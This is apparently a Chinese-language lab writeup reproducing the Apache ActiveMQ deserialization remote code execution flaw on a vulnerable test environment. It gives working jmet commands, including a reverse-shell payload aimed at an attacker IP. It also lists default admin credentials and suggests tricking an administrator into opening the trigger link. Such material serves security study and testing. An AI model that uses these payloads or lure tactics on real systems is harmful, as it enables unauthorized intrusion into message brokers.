# ActiveMQ反序列化漏洞

###### by ADummy

### 0x00利用路线

​			构造（可以使用ysoserial）可执行命令的序列化对象--->发送给目标61616端口--->访问web管理页面，读取消息，触发漏洞--->代码执行

### 0x01漏洞介绍

​			Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码

### 0x02漏洞复现

**下载：jmet-0.1.0-all.jar,在同目录下新建external文件夹**

**5.11版本的ActiveMQ应该使用jdk1.7，否则jmet发送消息会失败**

**payload:**

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 
ip 61616
```

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/your-ip/8888>&1" -Yp ROME  ip   61616
```

**查看消息界面http://your-ip:8161/admin/browse.jsp?JMSDestination=Event**

**登录名/密码  admin/admin**

​			**默认页面**

![ActiveMQ反序列化漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_1.jpg)

​			**使用jmet发送消息**

![ActiveMQ反序列化漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_2.jpg)

​				

​			**查看消息页面**

![ActiveMQ反序列化漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_3.jpg)



​			**发现 touch  /tmp/success被执行**

![ActiveMQ反序列化漏洞_4](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_4.jpg)



​			**执行反弹shellpayload**

![ActiveMQ反序列化漏洞_5](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_5.jpg)



​			**攻击机接到shell**

![ActiveMQ反序列化漏洞_6](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ActiveMQ反序列化漏洞_6.jpg)

值得注意的是，通过Web管理页面访问消息并触发漏洞需要管理员特权。在没有密码的情况下，我们可以诱使管理员访问我们的链接以进行触发，或者伪装成其他服务的合法消息在触发时需要等待客户端访问



### 0x03参考资料

jmet:https://github.com/matthiaskaiser/jmet/releases

jdk1.7:https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html

kali安装jdk1.7https://blog.csdn.net/qq_42954408/article/details/99079519